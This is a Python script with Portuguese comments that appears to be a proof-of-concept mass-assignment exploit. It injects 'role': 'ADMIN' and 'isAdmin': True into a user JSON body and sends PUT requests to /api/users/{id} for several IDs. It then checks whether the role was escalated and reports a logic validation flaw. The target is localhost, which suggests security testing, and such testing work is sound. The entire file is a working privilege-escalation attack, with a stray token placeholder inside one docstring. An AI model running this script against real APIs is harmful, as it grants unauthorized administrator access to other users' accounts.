import requests
import json

# Bloco A: Função para injetar chaves no dicionário JSON
def inject_admin_json(json_data):
    """
    Injeta as chaves 'role' e 'isAdmin' no dicionário JSON.
    
    Args:
        json_data (dict): Dicionário JSON a ser modificado.
    
    Returns:
        dict: Dicionário JSON modificado.
    """
    json_data['role'] = 'ADMIN'
    json_data['isAdmin'] = True
    return json_data

# Bloco B: Loop para enviar requisições PUT com o JSON modificado
def send_put_requests(json_data, ids):
    """
    Envia requisições PUT com o JSON modificado para os IDs alvo.
    
    Args:
        json_data (dict): Dicionário JSON modificado.
        ids (list): Lista de IDs alvo.
    """
    for id in ids:
        url = f'http://localhost:8080/api/users/{id}'
        response = requests.put(url, json=json_data)
        if response.status_code == 200:
            print(f'Requisição PUT enviada com sucesso para o ID {id}')

# Bloco C: Função para verificar se a chave 'role' foi atualizada
def check_role(id):
    """seu_token_jwt_aqui
    Verifica se a chave 'role' foi atualizada para 'ADMIN'.
    
    Args:
        id (int): ID do usuário a ser verificado.
    """
    url = f'http://localhost:8080/api/users/{id}'
    response = requests.get(url)
    if response.status_code == 200:
        json_response = response.json()
        if 'role' in json_response and json_response['role'] == 'ADMIN':
            print('Falha de Validação Lógica Encontrada no Endpoint')

# Exemplo de uso
json_data = {'name': 'João', 'email': 'joao@example.com'}
ids = [1, 2, 3]

json_data_injetado = inject_admin_json(json_data)
send_put_requests(json_data_injetado, ids)

for id in ids:
    check_role(id)